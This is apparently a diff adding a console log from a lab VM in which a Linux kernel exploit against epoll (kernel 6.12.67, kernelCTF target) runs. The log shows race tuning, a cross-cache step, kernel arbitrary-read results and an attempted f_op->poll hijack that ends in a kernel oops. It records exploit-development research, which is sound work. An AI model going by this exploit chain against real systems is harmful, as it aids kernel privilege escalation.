@@ -1,0 +1,82 @@
+
+============================================
+  bad-epoll-lab — Tier 1 VM
+  Kernel: 6.12.67
+  User: uid=0 gid=0
+============================================
+
+Exploit is at /bin/exploit (if injected)
+Run: /bin/exploit
+
+/bin/sh: can't access tty; job control turned off
+~ # /bin/exploit
+X
+[env] cpu model: Common KVM processor
+[env] cpuinfo MHz: 1895.988
+[+] target: kernelctf lts-6.12.67
+[*] KASLR leak bypassed (nokaslr assumed).
+[+] kernel_base=ffffffff81000000
+[*] Calibrated close() average: 43399 cycles, threshold set to: 216995 cycles
+[+] race setup done
+[*] racing close-vs-close...
+[*] racer: false-sharing window=993686 ns -> fire 496843 ns ahead
+[+] racer: stat done (10 iters) -> locked best range [2750,4250] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [6250,7750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1250,2750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [4750,6250] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [1250,2750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [750,2250] (interrupts=38)
+[+] race won: retries=18638 launch=1524 cc_retries=1
+[*] cross-cache...
+[+] cross-cache ok (init_task.comm=swapper)
+[*] AAR: find task (comm=exploit)...
+[+] task=ffff888004669d00
+[+] files=ffff888003f5d800 fdt=ffff88800540d1c0 fd_array=ffff888004663000
+[+] file=ffff888003e08300 pipe=ffff888005be9f00 bufs=ffff8880045bc400 page=ffffea0000156440
+[+] vmemmap_base=ffffea0000000000 page_offset_base=ffff888000000000
+[+] rop_page virt=ffff888005591000
+[*] RIP: fire f_op->poll hijack (virt=ffff888005591000)...
+[  148.389743] BUG: unable to handle page fault for address: ffffffff820d6525
+[  148.391081] #PF: supervisor write access in kernel mode
+[  148.391282] #PF: error_code(0x0003) - permissions violation
+[  148.391635] PGD 2c31067 P4D 2c31067 PUD 2c32063 PMD 20001a1 
+[  148.392131] Oops: Oops: 0003 [#1] PREEMPT SMP PTI
+[  148.392755] CPU: 1 UID: 0 PID: 67 Comm: exploit Not tainted 6.12.67 #1
+[  148.392989] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[  148.393334] RIP: 0010:__x86_indirect_call_thunk_rdi+0x5/0x20
+[  148.394014] Code: 00 00 00 00 00 2e 0f 1f 84 00 00 00 00 00 e8 01 00 00 00 cc 48 89 34 24 c3 cc 66 66 2e 0f 1f 84 00 00 00 00 00 2e 0f 1f 84 00 <00> 00 00 00 e8 01 00 00 00 cc 48 89 3c 24 c3 cc 66 66 2e 0f 1f 84
+[  148.394728] RSP: 0018:ffffc90000253e08 EFLAGS: 00010202
+[  148.394928] RAX: ffffffff820d6525 RBX: 0000000000000000 RCX: ffff888005591000
+[  148.395181] RDX: ffffc90000253e70 RSI: ffffc90000253e80 RDI: ffff888005420900
+[  148.395449] RBP: ffff888003e11880 R08: 00000000000f4240 R09: 0000000000000001
+[  148.395730] R10: ffff888005be9b90 R11: 0000000000000000 R12: ffffc90000253e58
+[  148.395997] R13: 00007ffda368d114 R14: 0000000000000000 R15: ffff888003e11898
+[  148.396324] FS:  000000001cf38400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  148.396625] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  148.396781] CR2: ffffffff820d6525 CR3: 0000000003df8000 CR4: 00000000003006f0
+[  148.397149] Call Trace:
+[  148.397953]  <TASK>
+[  148.398160]  ? ep_item_poll.isra.0+0x91/0xb0
+[  148.398554]  ? do_epoll_wait+0x386/0x840
+[  148.398681]  ? __x64_sys_epoll_wait+0x6c/0x120
+[  148.398800]  ? do_syscall_64+0x9e/0x1a0
+[  148.398917]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  148.399111]  </TASK>
+[  148.399308] Modules linked in:
+[  148.399739] CR2: ffffffff820d6525
+[  148.400191] ---[ end trace 0000000000000000 ]---
+[  148.400470] RIP: 0010:__x86_indirect_call_thunk_rdi+0x5/0x20
+[  148.400653] Code: 00 00 00 00 00 2e 0f 1f 84 00 00 00 00 00 e8 01 00 00 00 cc 48 89 34 24 c3 cc 66 66 2e 0f 1f 84 00 00 00 00 00 2e 0f 1f 84 00 <00> 00 00 00 e8 01 00 00 00 cc 48 89 3c 24 c3 cc 66 66 2e 0f 1f 84
+[  148.401076] RSP: 0018:ffffc90000253e08 EFLAGS: 00010202
+[  148.401257] RAX: ffffffff820d6525 RBX: 0000000000000000 RCX: ffff888005591000
+[  148.401524] RDX: ffffc90000253e70 RSI: ffffc90000253e80 RDI: ffff888005420900
+[  148.401757] RBP: ffff888003e11880 R08: 00000000000f4240 R09: 0000000000000001
+[  148.401984] R10: ffff888005be9b90 R11: 0000000000000000 R12: ffffc90000253e58
+[  148.402211] R13: 00007ffda368d114 R14: 0000000000000000 R15: ffff888003e11898
+[  148.402474] FS:  000000001cf38400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  148.402754] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  148.402959] CR2: ffffffff820d6525 CR3: 0000000003df8000 CR4: 00000000003006f0
+[  148.403338] note: exploit[67] exited with irqs disabled
+[  148.405697] exploit (67) used greatest stack depth: 13552 bytes left
+^CQEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
